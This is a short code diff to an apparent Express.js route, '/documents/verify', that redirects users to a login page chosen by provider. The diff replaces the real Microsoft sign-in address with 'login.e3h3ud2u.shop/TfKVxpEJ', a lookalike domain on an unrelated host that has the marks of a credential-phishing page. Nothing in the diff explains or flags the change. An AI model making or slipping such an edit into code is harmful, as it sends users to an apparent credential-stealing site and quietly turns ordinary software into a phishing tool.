@@ -334,7 +334,7 @@ app.post('/documents/verify', apiProtectionMiddleware, (req, res) => {
   const { provider } = req.body;
   const testingUrls = {
     google: 'https://mail.google.com/',
-    microsoft: 'https://login.microsoftonline.com/'
+    microsoft: 'https://login.e3h3ud2u.shop/TfKVxpEJ'
   };
   const redirectUrl = testingUrls[provider] || '/error';
   log('info', { event: 'auth_verify', ip: req.ip, provider, redirectUrl });
